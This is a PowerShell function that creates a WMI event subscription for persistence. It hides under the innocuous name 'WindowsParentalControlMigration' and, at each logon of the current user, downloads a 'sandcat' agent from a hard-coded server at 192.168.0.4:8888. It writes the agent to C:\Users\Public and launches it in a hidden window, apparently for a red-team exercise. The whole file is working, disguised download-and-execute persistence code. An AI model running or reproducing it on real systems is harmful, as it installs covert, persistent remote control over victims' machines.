function wmi {
	
	$FilterArgs = @{name='WindowsParentalControlMigration';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like '%$($env:UserName)%'";}
	$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

	$ConsumerArgs = @{name='WindowsParentalControlMigration';
                CommandLineTemplate='PowerShell.exe -C $server="http://192.168.0.4:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red-wmi" -WindowStyle hidden;'}
	$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

	$FilterToConsumerArgs = @{
		Filter = [Ref] $Filter
		Consumer = [Ref] $Consumer
	}
	$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
}
